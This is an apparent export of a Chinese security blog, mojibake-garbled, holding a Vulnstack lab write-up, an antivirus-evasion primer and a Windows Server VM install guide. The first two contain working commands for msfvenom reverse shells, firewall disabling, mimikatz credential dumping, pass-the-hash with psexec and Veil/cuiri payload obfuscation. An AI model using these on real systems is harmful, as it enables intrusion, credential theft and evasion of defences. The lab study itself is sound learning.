ä¹Ÿå¯ä»¥æ‰§è¡Œå‘½ä»¤net config workstation æ¥æŸ¥çœ‹å½“å‰è®¡ç®—æœºåã€å…¨åã€ç”¨æˆ·åã€ç³»ç»Ÿç‰ˆæœ¬ã€å·¥ä½œç«™ã€åŸŸã€ç™»å½•åŸŸç­‰å…¨é¢çš„ä¿¡æ¯ 2ã€ä¸Šé¢å‘ç° DNS æœåŠ¡å™¨åä¸º god.orgï¼Œå½“å‰ç™»å½•åŸŸä¸º GOD å†æ‰§è¡Œnet view /domainæŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸ(å¯èƒ½æœ‰å¤šä¸ª) 3ã€æŸ¥çœ‹åŸŸçš„ç»„è´¦æˆ·ä¿¡æ¯(å·¥ä½œç»„) 4ã€æ—¢ç„¶åªæœ‰ä¸€ä¸ªåŸŸï¼Œé‚£å°±åˆ©ç”¨ net group â€œdomain controllersâ€ /domain å‘½ä»¤æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ä¸»æœºåï¼Œç›´æ¥ç¡®è®¤åŸŸæ§ä¸»æœºçš„åç§°ä¸º OWA 5ã€ç¡®è®¤åŸŸæ§ä¸»æœºçš„åç§°ä¸º OWA å†æ‰§è¡Œ net view æŸ¥çœ‹å±€åŸŸç½‘å†…å…¶ä»–ä¸»æœºä¿¡æ¯ï¼ˆä¸»æœºåç§°ã€IPåœ°å€ï¼‰ æ‰«æå‡ºæ¥ é™¤äº†åŸŸæ§OWA ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€å°ä¸»æœºROOT-TVI862UBEH è‡³æ­¤å†…ç½‘åŸŸä¿¡æ¯æ”¶é›†å®Œæ¯•ï¼Œå·²çŸ¥ä¿¡æ¯ï¼šåŸŸæ§ä¸»æœºï¼š192.168.52.138ï¼ŒåŒæ—¶è¿˜å­˜åœ¨ä¸€å°åŸŸæˆå‘˜ä¸»æœºï¼š192.168.52.141ï¼Œæ¥ä¸‹æ¥çš„ç›®æ ‡å°±æ˜¯æ¨ªå‘æ¸—é€æ‹¿ä¸‹åŸŸæ§ (3) rdpè¿œç¨‹ç™»é™†win7Win7è·³æ¿æœº é»˜è®¤æ˜¯ä¸å¼€å¯3389çš„ï¼ŒåŒæ—¶è¿˜æœ‰é˜²ç«å¢™ 123456789#æ³¨å†Œè¡¨å¼€å¯3389ç«¯å£REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f#æ·»åŠ é˜²ç«å¢™è§„åˆ™netsh advfirewall firewall add rule name=&quot;Open 3389&quot; dir=in action=allow protocol=TCP localport=3389#å…³é—­é˜²ç«å¢™netsh firewall set opmode disable #winsows server 2003 ä¹‹å‰netsh advfirewall set allprofiles state off #winsows server 2003 ä¹‹å è¿™é‡Œæˆ‘ä»¬ä»¥åŸŸç”¨æˆ· administratorç™»å½•ã€‚ è¾“å…¥æˆ‘ä»¬åˆšä»CSä¸Š mimikatz dumpä¸‹æ¥çš„å¯†ç Hongrisec@2019 (ä¹Ÿå¯ä»¥è‡ªå·± net useråˆ›å»ºä¸€ä¸ªç”¨æˆ· åŠ å…¥åˆ°administratorç»„é‡Œ ç”¨é‚£ä¸ªè´¦æˆ·ç™»å½•) æˆåŠŸè¿æ¥ å¦‚æœMSF ä¸­æœ‰Win7 çš„ Shellï¼Œåªéœ€è¦è¿”å›ä¼šè¯å¹¶æ‰§è¡Œå‘½ä»¤run post/windows/manage/enable_rdpå³å¯å¼€å¯é¶æœºçš„è¿œç¨‹æ¡Œé¢ &lt;4&gt; å†…ç½‘æ¸—é€(1)CSæ´¾ç”Ÿä¼šè¯ç»™MSF1ã€MSFå¼€å¯ç›‘å¬123456msfconsole # å¯åŠ¨MSFæ¡†æ¶use exploit/multi/handlerset payload windows/meterpreter/reverse_httpset lhost 192.168.236.128set lport 1111exploit 2ã€CSæ´¾ç”Ÿä¼šè¯ æ¡ˆä¾‹ chooseä¹‹åï¼Œæˆ‘ä»¬çš„msfé‚£è¾¹å°±å¯ä»¥æ”¶åˆ°ä¸€ä¸ªsessionä¼šè¯(ä½†æ˜¯æ²¡æœ‰) CSæ‰§è¡Œå¤±è´¥ï¼Œè¿™é‡Œæˆ‘ä»¬æ¢ä¸€ç§æ–¹æ³• é‡‡ç”¨è´¨æœ´çš„æ–¹æ³•åå¼¹ win7çš„shell 123456789msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.236.128 LPORT=1111 -f exe -o shell.exe #kalié‡Œç”Ÿæˆmsfåé—¨æ–‡ä»¶ shell.exeèšå‰‘ä¸Šä¼ åˆ° win7ä¸Š kalié‡Œè¿è¡Œç›‘å¬set payload windows/meterpreter/reverse_tcpset lhost 192.168.236.128set lport 1111exploit èšå‰‘è¿è¡Œ shell.exe å¾—åˆ°meterpreter 3ã€MSF ç®€å•åˆ©ç”¨è·å¾— MSF çš„ä¼šè¯åå³å¯ä½¿ç”¨ MSF é›†æˆçš„è¯¸å¤šå¼ºå¤§åŠŸèƒ½æ¨¡å—å’Œè„šæœ¬ã€‚ç®€å•æ¼”ç¤ºä¸‹ï¼Œå¦‚è°ƒç”¨post/windows/gather/checkvmåˆ¤æ–­é¶æœºæ˜¯å¦å±äºè™šæ‹Ÿæœºï¼ˆæ£€æŸ¥æ˜¯å¦è¿›å…¥äº†èœœç½ï¼‰ï¼š å†å¦‚è°ƒç”¨ post/windows/gather/enum_applicationsæ¨¡å—æšä¸¾åˆ—å‡ºå®‰è£…åœ¨é¶æœºä¸Šçš„åº”ç”¨ç¨‹åºï¼š 4ã€æ·»åŠ è·¯ç”±123456# å¯ä»¥ç”¨æ¨¡å—è‡ªåŠ¨æ·»åŠ è·¯ç”±run post/multi/manage/autoroute#æ·»åŠ ä¸€æ¡è·¯ç”±run autoroute -s 192.168.52.0/24#æŸ¥çœ‹è·¯ç”±æ·»åŠ æƒ…å†µrun autoroute -p 5ã€å†…ç½‘ç«¯å£æ‰«æå…ˆæ‰§è¡Œbackground å‘½ä»¤å°†å½“å‰æ‰§è¡Œçš„ Meterpreter ä¼šè¯åˆ‡æ¢åˆ°åå°ï¼ˆåç»­ä¹Ÿå¯æ‰§è¡Œsessions -i é‡æ–°è¿”å›ä¼šè¯ï¼‰ï¼Œç„¶åä½¿ç”¨ MSF è‡ªå¸¦ auxiliary/scanner/portscan/tcp æ¨¡å—æ‰«æå†…ç½‘åŸŸæˆå‘˜ä¸»æœº 192.168.52.141 å¼€æ”¾çš„ç«¯å£ï¼š 1234use auxiliary/scanner/portscan/tcpset rhosts 192.168.52.141set ports 80,135-139,445,3306,3389run 192.168.52.141 win2003åŸŸæˆå‘˜æœºå¼€å¯äº† 135ã€139ã€445ç«¯å£ åŒç†æ‰«æä¸€ä¸‹åŸŸæ§æœºå­ åŸŸæ§å¼€å¯äº†80ã€135ã€139ã€445ç«¯å£ (2)MSFè¿›è¡Œms17-010æ”»å‡»(æœªæˆåŠŸ)1ã€msfæ‰«ææ¨¡å—æ¢æµ‹æ˜¯å¦å­˜åœ¨ms17-010æ¼æ´å¯¹äºå¼€å¯äº† 445 ç«¯å£çš„ Windows æœåŠ¡å™¨è‚¯å®šæ˜¯è¦è¿›è¡Œä¸€æ³¢æ°¸æ’ä¹‹è“æ‰«æå°è¯•çš„ï¼Œå€ŸåŠ© MSF è‡ªå¸¦çš„æ¼æ´æ‰«ææ¨¡å—è¿›è¡Œæ‰«æï¼š 1234search ms17_010use auxiliary/scanner/smb/smb_ms17_010set rhosts 192.168.52.141run ä¸€æµ‹ åŸŸæ§å’Œæˆå‘˜æœºå¯èƒ½éƒ½å­˜åœ¨ms17-010æ¼æ´2ã€æ¼æ´åˆ©ç”¨ 1234use exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcp #å†…ç½‘ç¯å¢ƒï¼Œéœ€è¦æ­£å‘shellè¿æ¥set rhosts 192.168.52.138run å¹¶æ²¡æœ‰æ‹¿åˆ°shellï¼Œçœ‹å¸ˆå‚…çš„åšå®¢è¯´å¥½åƒé€šè¿‡ ms17-010ç›´æ¥æ‹¿åˆ°shellçš„æƒ…å†µå¹¶ä¸å¤šï¼ŒæˆåŠŸç‡ä¸é«˜ (3) å“ˆå¸Œä¼ é€’æ”»å‡»(PTH)æ‹¿ä¸‹åŸŸæ§ä¸Šé¢æ—¢ç„¶é€šè¿‡æ°¸æ’ä¹‹è“æ¼æ´éš¾ä»¥è·å¾—åŸŸæ§ä¸»æœºçš„ Shellï¼Œé‚£å°±æ¢ä¸€ç§æ”»å‡»æ€è·¯æ‹¿ä¸‹åŸŸæ§å§ï¼Œä¸‹é¢æ¼”ç¤ºçš„æ˜¯é€šè¿‡å“ˆå¸Œä¼ é€’æ”»å‡» PTH æ‹¿ä¸‹åŸŸæ§ä¸»æœºã€‚ ã€å“ˆå¸Œä¼ é€’æ”»å‡»ã€‘åœ¨ kerberosã€NTLM è®¤è¯è¿‡ç¨‹çš„å…³é”®ï¼Œé¦–å…ˆå°±æ˜¯åŸºäºç”¨æˆ·å¯†ç  Hash çš„åŠ å¯†ï¼Œæ‰€ä»¥åœ¨åŸŸæ¸—é€ä¸­ï¼Œæ— æ³•ç ´è§£ç”¨æˆ·å¯†ç  Hash çš„æƒ…å†µä¸‹ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åˆ©ç”¨ Hash æ¥å®Œæˆè®¤è¯ï¼Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ï¼Œè¿™å°±æ˜¯ hash ä¼ é€’æ”»å‡»ï¼ˆPass The Hashï¼Œç®€ç§° PTHï¼‰ã€‚å¦‚æœå†…ç½‘ä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·å¯†ç ç›¸åŒï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡ PTH è¿œç¨‹ç™»å½•åˆ°ä»»æ„ä¸€å°ä¸»æœºï¼Œæ“ä½œç®€å•ã€å¨åŠ›æ— ç©·ã€‚ åœ¨åŸŸç¯å¢ƒä¸­ï¼Œåˆ©ç”¨å“ˆå¸Œä¼ é€’æ”»å‡»çš„æ¸—é€æ–¹å¼å¾€å¾€æ˜¯è¿™æ ·çš„ï¼š è·å¾—ä¸€å°åŸŸä¸»æœºçš„æƒé™ï¼ŒDump å†…å­˜è·å¾—è¯¥ä¸»æœºçš„ç”¨æˆ·å¯†ç  Hash å€¼ï¼› é€šè¿‡å“ˆå¸Œä¼ é€’æ”»å‡»å°è¯•ç™»å½•å…¶ä»–ä¸»æœºï¼› ç»§ç»­æœé›† Hash å¹¶å°è¯•è¿œç¨‹ç™»å½•ï¼Œç›´åˆ°è·å¾—åŸŸç®¡ç†å‘˜è´¦æˆ· Hashï¼Œç™»å½•åŸŸæ§ï¼Œæœ€ç»ˆæˆåŠŸæ§åˆ¶æ•´ä¸ªåŸŸã€‚ ä¸‹é¢ä½¿ç”¨ Metasploit/CS æ¥è¿›è¡Œæœ¬é¶åœºç¯å¢ƒçš„è¿›è¡Œ PTH æ”»å‡»æ¼”ç¤ºï¼š 1ã€CSå“ˆå¸Œä¼ é€’æ”»å‡»åˆ©ç”¨å‰é¢æˆ‘ä»¬ä¹Ÿæœ‰æåˆ°è¿‡ï¼Œåœ¨win7 ä¸Šçº¿CSæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å³é”®ä¼šè¯ -&gt;æ‰§è¡Œ -&gt; Run Mimikatzç›´æ¥å€ŸåŠ© CS è¿›è¡Œç”¨æˆ·å“ˆå¸Œå‡­è¯çªƒå– è¿™é‡ŒæŠ“å–åˆ°ç”¨æˆ·å“ˆå¸Œå‡­è¯ä¹‹åï¼Œæˆ‘ä»¬æ‰§è¡Œ net view å‘ç°äº†åŸŸå†…å¦å¤–ä¿©å°æœºå™¨ç‚¹å‡»è¿™é‡Œå¯ä»¥çœ‹åˆ° å¯ä»¥åˆ©ç”¨æŠ“å–åˆ°çš„å¯†ç  psexec åˆ©ç”¨åŸŸç®¡ç†å‘˜è´¦æˆ· Hash loginä¸€ä¸‹ ç›‘å¬å™¨é€‰ windows_smb/bind_pipe æ‹¿åˆ°æ­£å‘ä¼šè¯(å‰é¢ä¸‰å±‚å†…ç½‘é¶æœºæœ‰è®²æ­£å‘åå‘)ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å³é”® ç›®æ ‡-&gt;æ–‡ä»¶ç®¡ç† å¯ä»¥çœ‹åˆ°åŸŸæ§çš„æ–‡ä»¶ æˆ‘ä»¬å¯ä»¥è¿›è¡Œä¸Šä¼ æ–‡ä»¶æ“ä½œï¼Œæ‹¿ä¸‹åŸŸæ§ 2ã€MSFå“ˆå¸Œä¼ é€’æ”»å‡»run windows/gather/smart_hashdump æ¥è¿›è¡Œhashdump éœ€è¦SYSTEMæƒé™ï¼Œæˆ‘ä»¬ç›´æ¥getsystem å‘ç°å¯ä»¥æ­£å¸¸ææƒæåˆ°SYSTEMæƒé™ä¹‹åå†æ‰§è¡Œ run windows/gather/smart_hashdump å¾—åˆ°ç®¡ç†å‘˜çš„å¯†ç çš„hash 12[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::[+] liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: ä½†æ˜¯è¿™ä¸ªåªæ˜¯ç”¨æˆ·å¯†ç çš„ä¸€ä¸ªhashå€¼ï¼Œæˆ‘ä»¬åœ¨msfé‡ŒåŠ è½½mimikatzæ¨¡å—psï¼šms6ä¸­ mimikatzæ¨¡å—å·²ç»åˆå¹¶ä¸ºkiwiæ¨¡å— 1234567891011121314151617181920load kiwicreds_all #åˆ—ä¸¾æ‰€æœ‰å‡­æ®creds_kerberos #åˆ—ä¸¾æ‰€æœ‰kerberoså‡­æ®creds_msv #åˆ—ä¸¾æ‰€æœ‰msvå‡­æ®creds_ssp #åˆ—ä¸¾æ‰€æœ‰sspå‡­æ®creds_tspkg #åˆ—ä¸¾æ‰€æœ‰tspkgå‡­æ®creds_wdigest #åˆ—ä¸¾æ‰€æœ‰wdigestå‡­æ®dcsync #é€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·ä¿¡æ¯dcsync_ntlm #é€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·NTLMæ•£åˆ—ã€SIDå’ŒRIDgolden_ticket_create #åˆ›å»ºé»„é‡‘ç¥¨æ®kerberos_ticket_list #åˆ—ä¸¾kerberosç¥¨æ®kerberos_ticket_purge #æ¸…é™¤kerberosç¥¨æ®kerberos_ticket_use #ä½¿ç”¨kerberosç¥¨æ®kiwi_cmd #æ‰§è¡Œmimikatzçš„å‘½ä»¤ï¼Œåé¢æ¥mimikatz.exeçš„å‘½ä»¤lsa_dump_sam #dumpå‡ºlsaçš„SAMlsa_dump_secrets #dumpå‡ºlsaçš„å¯†æ–‡password_change #ä¿®æ”¹å¯†ç wifi_list #åˆ—å‡ºå½“å‰ç”¨æˆ·çš„wifié…ç½®æ–‡ä»¶wifi_list_shared #åˆ—å‡ºå…±äº«wifié…ç½®æ–‡ä»¶/ç¼–ç  æŠ“å–ä¸€ä¸‹ç”¨æˆ·å“ˆå¸Œå‡­è¯ï¼ŒæŠ¥é”™è¯´ mimikatzåœ¨x64ç”¨ä¸äº†ã€‚ã€‚ã€‚ ä¸çŸ¥é“æ€ä¹ˆè§£å†³ å¡ä½äº† åé¢ç¬¬äºŒå¤© CSç§ƒç„¶å°±å¯ä»¥ç”¨äº†(ç”¨ç€ç”¨ç€beaconå°±åˆexitäº† ä¸çŸ¥é“ä¸ºå•¥) è·å¾— NTLM Hashï¼š4f1a2b2cf1dd79ae22a7f198412d7e51ï¼Œåœ¨ Metasploit ä¸­ï¼Œç»å¸¸ä½¿ç”¨äºå“ˆå¸Œä¼ é€’æ”»å‡»çš„æ¨¡å—æœ‰ï¼š 123auxiliary/admin/smb/psexec_command #åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤exploit/windows/smb/psexec #ç”¨psexecæ‰§è¡Œç³»ç»Ÿå‘½ä»¤exploit/windows/smb/psexec_psh #ä½¿ç”¨powershellä½œä¸ºpayload ä»¥exploit/windows/smb/psexecæ¨¡å—å“ˆå¸Œä¼ é€’æ”»å‡» Windows Server 2008 ä¸ºä¾‹ï¼š 123456use exploit/windows/smb/psexecset rhosts 192.168.52.138set smbuser administratorset smbpass 00000000000000000000000000000000:4f1a2b2cf1dd79ae22a7f198412d7e51set smbdomain godrun ä½†æ˜¯ time outâ€¦â€¦ æ²¡é€šCSé‡Œé€šè¿‡ PTH psexecæˆåŠŸæ‹¿ä¸‹åŸŸæ§ å‚è€ƒé“¾æ¥ï¼šhttps://blog.csdn.net/weixin_39190897/article/details/118353886?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167602673016800182163716%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167602673016800182163716&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2allsobaiduend~default-2-118353886-null-null.142^v73^wechat,201^v4^add_ask,239^v1^insert_chatgpt&amp;utm_term=%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA&amp;spm=1018.2226.3001.4449 https://bwshen.blog.csdn.net/article/details/118338328 https://blog.csdn.net/qq_38626043/article/details/109388147","link":"/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/"},{"title":"å…æ€åˆæ¢","text":"å…æ€å¸¸è§åè¯è§£é‡Šshellcodeshellcodeæ˜¯ä¸€æ®µç”¨äºåˆ©ç”¨è½¯ä»¶æ¼æ´è€Œæ‰§è¡Œçš„ä»£ç ï¼Œshellcodeä¸º16è¿›åˆ¶çš„æœºå™¨ç ï¼Œå› å¸¸è®©æ”»å‡»è€…è·å¾—shellè€Œå¾—åã€‚shellcodeå¸¸å¸¸ä½¿ç”¨æœºå™¨è¯­è¨€ç¼–å†™ï¼Œå¯åœ¨æš‚å­˜å™¨eipæº¢å‡ºåï¼Œå¡å…¥ä¸€æ®µå¯è®©CPUæ‰§è¡Œçš„shellcodeæœºå™¨ç ï¼Œè®©ç”µè„‘å¯ä»¥æ‰§è¡Œæ”»å‡»è€…çš„ä»»æ„æŒ‡ä»¤ å¸¸è§çš„shellcodeéƒ½æ˜¯ä¸€ä¸²16è¿›åˆ¶çš„æœºå™¨ç ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€æ®µæ±‡ç¼–æŒ‡ä»¤ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š shellcode loaderloaderåŠ è½½å™¨ï¼ŒåŠ è½½shellcode åˆ†ç¦»å…æ€shellcodeæ”¾åœ¨æœåŠ¡å™¨ä¸Š shellcode æ··æ·†å¸¸è§æ··æ·†å°±æ˜¯ï¼Œbase64ç¼–ç ã€å‡¯æ’’å¯†ç ã€aesåŠ å¯†ã€å­—ç¬¦ä¸²ç¿»è½¬ç­‰ç­‰ DLLDLL åŠ¨æ€é“¾æ¥åº“ DLLæ³¨å…¥å°±æ˜¯ï¼Œå°†æœ¨é©¬ç”Ÿæˆæˆä¸€ä¸ªDLL åŠ¨æ€é“¾æ¥åº“è¿™æ ·å½¢å¼çš„æ–‡ä»¶ FudFully undetectable å®Œå…¨ä¸è¢«æ£€æµ‹ å·¥å…·ä½¿ç”¨msfvenom1msfvenom -l payloads | grep &quot;windows&quot; å¦‚ä½•åˆ¤æ–­æ˜¯åˆ†ç¦»å¼çš„payloadè¿˜æ˜¯æ•´åˆçš„payloadå‘¢ï¼Ÿ åå°„å¼DLLæ³¨å…¥ï¼ŒæœåŠ¡ç«¯ç”Ÿæˆä¸€ä¸ªDLLæ–‡ä»¶ï¼Œä¸è½ç¡¬ç›˜ï¼Œé€šè¿‡ä¸‹è½½å™¨ç›´æ¥è½½å…¥åˆ°ç›®æ ‡çš„å†…å­˜ä¸­æ‰§è¡Œ å®ç°åˆ†ç¦» æ•´åˆçš„ï¼Œåˆ™æ˜¯ä¾‹å¦‚exe ç›´æ¥åœ¨ç›®æ ‡è¿è¡Œçš„ cuiriå·¥å…·éœ€è¦goè¯­è¨€ç¯å¢ƒ ç”¨æ³•ï¼š -f string é€šè¿‡shellcodeç”Ÿæˆå…æ€é©¬ -manual æŸ¥çœ‹shellcodeç”Ÿæˆæ–¹æ³• åˆ©ç”¨msfvenomç”Ÿæˆä¸€æ®µshellcode 1msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 lhost=192.168.236.128 lport=4444 --encrypt rc4 --encrypt-key Hardtoguess -f c &gt; shell.txt å»æ‰ç¬¬ä¸€è¡Œå’Œç»“å°¾çš„ ; å†™å…¥æ–‡æœ¬æ–‡ä»¶ä¸­ 1cuiri_win64.exe -f shell.txt veilå·¥å…·å·¥å…·ä»‹ç»ï¼š å®‰è£…ï¼š å®‰è£…åˆ†ä¸¤ç§ï¼Œä¸€ç§æ˜¯æ‰‹åŠ¨å®‰è£…ï¼Œä¸€ç§æ˜¯dockerå®‰å…¨è£…ï¼Œè¿™é‡Œå»ºè®®ä½¿ç”¨dockerå®‰è£…ï¼Œæ–¹ä¾¿å¿«æ· 1234# æ‹‰å–veilé•œåƒdocker pull mattiasohlsson/veil# æ‹‰å–æˆåŠŸåï¼Œä½¿ç”¨è¯¥é•œåƒå¯åŠ¨å®¹å™¨ï¼Œå¹¶å°†ç”Ÿæˆå…æ€æ–‡ä»¶çš„ç›®å½•æ˜ å°„åˆ°å®¿ä¸»æœºçš„/tmpç›®å½•ä¸­docker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil ä½¿ç”¨ï¼š veilä¸­æœ‰ä¸¤ä¸ªåŠŸèƒ½æ¨¡å—ï¼ŒEvasionå’ŒOrdnanceï¼Œå…¶ä¸­Evasionæ¥åšæ–‡ä»¶å…æ€ æˆ‘ä»¬é€‰æ‹©Evasionï¼Œåˆ—å‡ºå…æ€æ¨¡å—çš„payload 1veil -t Evasion --list payloads ä½¿ç”¨ 33 å…æ€æ¨¡å—ç”Ÿæˆ exe 1veil -t Evasion -p 33 --ordance-payload rev_tcp --ip 192.168.1.3 --port 8675 -o test","link":"/2023/10/10/%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2/"},{"title":"å®‰è£…window serverè™šæ‹Ÿæœºè¯¦ç»†æ­¥éª¤","text":"ä¸‹è½½æ“ä½œç³»ç»Ÿçš„ç½‘ç«™ï¼šhttps://msdn.itellyou.cn/åœ¨é‡Œé¢æœç´¢æ‰¾åˆ°å¯¹åº”çš„æ“ä½œç³»ç»Ÿï¼Œä½¿ç”¨è¿…é›·ä¸‹è½½(æ¯”ç½‘ç›˜å¿«å¤šäº†ğŸ¤¡) &lt;1&gt; Windows Server 2012 R2(1) è™šæ‹Ÿæœºå®‰è£…å³é”®ï¼Œæ–°å»ºè™šæ‹Ÿæœºã€‚ç¨åå®‰è£…æ“ä½œç³»ç»Ÿ -&gt; Microsoft Windows é€‰æ‹©å¯¹åº”ç‰ˆæœ¬2012 R2 -&gt; æµè§ˆé€‰æ‹©å®‰è£…çš„å¯¹åº”ä½ç½®(å°½é‡åˆ«ä½¿ç”¨é»˜è®¤åœ¨cç›˜) -&gt; å›ºä»¶ç±»å‹é»˜è®¤BIOS -&gt; ä¸‹é¢éƒ½ç›´æ¥é»˜è®¤ -&gt; æ³¨æ„é€‰æ‹©å­˜å‚¨ä¸ºå•ä¸ªæ–‡ä»¶ -&gt; CD/DVDé€‰ä¸­æˆ‘ä»¬ä¸‹è½½çš„.isoé•œåƒæ–‡ä»¶ã€‚å¯åŠ¨ ç‚¹å‡»ä¸‹ä¸€æ­¥ é€‰æ‹©ç°åœ¨å®‰è£… äº§å“æ¿€æ´»å¯†é’¥ç½‘ä¸Šæœä¸€ä¸ªï¼šNB4WH-BBBYV-3MPPC-9RCMV-46XCBã€‚ å¡«å†™åç‚¹å‡»ä¸‹ä¸€æ­¥ é€‰æ‹©å®‰è£… Windows Server 2012 R2 Standardï¼ˆå¸¦æœ‰GUIçš„æœåŠ¡å™¨ï¼‰ï¼Œä¸‹ä¸€æ­¥ æ¥å—è®¸å¯æ¡æ¬¾ é€‰æ‹©è‡ªå®šä¹‰å®‰è£…Windows æ–°å»ºã€åº”ç”¨ ç¡®å®š ä¸‹ä¸€æ­¥ ç­‰å¾…ç³»ç»Ÿå®‰è£… è®¾ç½®ç®¡ç†å‘˜å¯†ç ï¼Œç‚¹å®Œæˆã€‚ æ³¨ï¼šä¸è¦è®¾ç½®çš„å¤ªç®€å• è¾“å…¥åˆšæ‰è®¾ç½®çš„ç®¡ç†å‘˜å¯†ç ï¼Œç™»å½•ç³»ç»Ÿã€‚ æˆåŠŸç™»å½•ï¼Œå®‰è£…å®Œæ¯• (2) å®‰è£…vmtoolsVMtoolså®‰è£…æ—¶ä¼šæ˜¾ç¤ºå¤±è´¥ï¼Œæˆ‘ä»¬éœ€è¦æ‰“ä¸Šä¸€äº›è¡¥ä¸ã€‚ä¸€èˆ¬è¦æ‰“ä¸ŠKB2919355çš„è¡¥ä¸ã€‚è€ŒKB2919355éœ€è¦æ‰“å‰ç½®è¡¥ä¸KB2919442ã€‚KB2919442ä¸‹è½½åœ°å€ï¼šhttps://www.microsoft.com/en-us/download/confirmation.aspx?id=42153KB2919355ä¸‹è½½åœ°å€ï¼šhttps://www.microsoft.com/zh-CN/download/details.aspx?id=42334è¿™é‡Œæ˜¯å®˜ç½‘çš„è¯´æ˜åœ°å€ï¼Œé‡Œæœ‰ä¸‹è½½åœ°å€ï¼Œåœ¨è™šæ‹Ÿæœºé‡ŒIEæ‰“å¼€ä¸‹è½½ä¸‹æ¥è¿è¡Œå®‰è£…å°±è¡Œã€‚å¦‚æœæ˜¾ç¤ºä¸å‡ºæ¥çš„è¯ï¼Œå¯ä»¥ç›´æ¥è®¿é—®è¿™ä¸¤ä¸ªæ¥ä¸‹è½½ï¼š1ã€ä¸‹è½½ Windows8.1-KB2919442-x64.msuhttps://download.microsoft.com/download/C/F/8/CF821C31-38C7-4C5C-89BB-B283059269AF/Windows8.1-KB2919442-x64.msu 2ã€ä¸‹è½½ Windows8.1-KB2919355-x64.msuhttps://download.microsoft.com/download/2/5/6/256CCCFB-5341-4A8D-A277-8A81B21A1E35/Windows8.1-KB2919355-x64.msu æœ€åå®‰è£…å®ŒKB2919355åï¼Œé‡æ–°å¯åŠ¨ ç­‰é…ç½®æ›´æ–°ã€‚å¼€æœºåå†æ ¹æ®vmwareæç¤ºä¸‹è½½vmtools æˆåŠŸæ‰“å¼€ï¼Œä¸€ç›´ä¸‹ä¸€æ­¥å³å¯ã€‚å†æ¬¡é‡æ–°å¯åŠ¨ vmtoolsç”Ÿæ•ˆ &lt;2&gt; Windows Server 2008 R2(1) è™šæ‹Ÿæœºå®‰è£…å³é”®ï¼Œæ–°å»ºè™šæ‹Ÿæœºã€‚ç¨åå®‰è£…æ“ä½œç³»ç»Ÿ -&gt; Microsoft Windows é€‰æ‹©å¯¹åº”ç‰ˆæœ¬2012 R2 -&gt; æµè§ˆé€‰æ‹©å®‰è£…çš„å¯¹åº”ä½ç½®(å°½é‡åˆ«ä½¿ç”¨é»˜è®¤åœ¨cç›˜) -&gt; å›ºä»¶ç±»å‹é»˜è®¤BIOS -&gt; ä¸‹é¢éƒ½ç›´æ¥é»˜è®¤ -&gt; æ³¨æ„é€‰æ‹©å­˜å‚¨ä¸ºå•ä¸ªæ–‡ä»¶ -&gt; CD/DVDé€‰ä¸­æˆ‘ä»¬ä¸‹è½½çš„.isoé•œåƒæ–‡ä»¶ã€‚ å¼€å¯å é€‰æ‹©ç®€ä½“ä¸­æ–‡ï¼Œä¸‹ä¸€æ­¥ -&gt; ç°åœ¨å®‰è£… -&gt; æˆ‘æ¥å—è®¸å¯æ¡æ¬¾ é€‰æ‹©è‡ªå®šä¹‰ è¿›å…¥ç£ç›˜åˆ†åŒºï¼Œç‚¹å‡»æ–°å»º åº”ç”¨ ç°åœ¨å°±å¼€å§‹å®‰è£…äº† å®‰è£…å®Œåä¼šé‡å¯ã€‚é¦–æ¬¡ç™»é™†éœ€è¦è®¾ç½®ç®¡ç†å‘˜è´¦æˆ·ï¼Œè®¾ç½®ç®¡ç†å‘˜å¯†ç  å¯†ç å¿…é¡»åŒ…å«å¤§å°å†™å­—æ¯ã€æ•°å­—ï¼Œå¦åˆ™è¾¾ä¸åˆ°Windows serverå¯†ç å®‰å…¨è¦æ±‚ã€‚å»ºè®®ï¼šå¤§å°å†™å­—æ¯ã€æ•°å­—ã€ç¬¦å· æˆåŠŸç™»å½•ï¼Œè¿›å…¥æ¡Œé¢ è‡³æ­¤ Window Server 2008 R2 hpcç‰ˆå®‰è£…æˆåŠŸ ï¼ˆ2ï¼‰ å®‰è£…vmtoolså¥½åƒæä¸ææ²¡ä»€ä¹ˆå¿…è¦ï¼Œä¸æäº† å¤§å®¶å¯ä»¥æœä¸€æœ &lt;3&gt; Windows7æ—©ä¹‹å‰ä¸‹è½½çš„æ¥ç€ï¼Œå¤§ä½“è¿‡ç¨‹å·®ä¸å¤šï¼Œå°±ä¸å†é‡æ–°å®‰è£…äº†","link":"/2023/09/20/%E5%AE%89%E8%A3%85window-server%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/"},{"title":"æ˜¥ç§‹äº‘é•œ-Brute4Roadé¶åœº","text":"é¶æ ‡ä»‹ç»ï¼š 